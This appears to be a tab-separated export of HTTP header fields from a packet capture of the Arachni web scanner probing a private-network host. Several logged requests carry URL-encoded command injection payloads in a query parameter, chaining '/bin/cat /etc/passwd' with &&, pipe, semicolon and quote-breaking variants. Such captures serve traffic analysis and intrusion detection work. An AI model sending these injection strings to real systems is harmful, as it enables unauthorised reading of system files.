http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			Arachni/v1.5.1				/web
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			Arachni/v1.5.1				/web
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									5						1	http://192.168.1.102/web/		GET				HTTP/1.1																			Arachni/v1.5.1				/web/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									6						1	http://192.168.1.102/web/		GET				HTTP/1.1																			Arachni/v1.5.1				/web/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									9						1	http://192.168.1.102/web/?s=%2Fbin%2Fcat%20%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2Fbin%2Fcat%20%2Fetc%2Fpasswd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									10						1	http://192.168.1.102/web/?s=		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=1		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=1
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%20%26%26%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%26%26%20		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%20%26%26%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%26%26%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%20%7C%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%7C%20		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%20%7C%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%7C%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%20%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%3B%20		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%20%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%3B%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%27%20%26%26%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%26%26%20%27		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%27%20%26%26%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%26%26%20%27
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%27%20%7C%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%7C%20%27		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%27%20%7C%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%7C%20%27
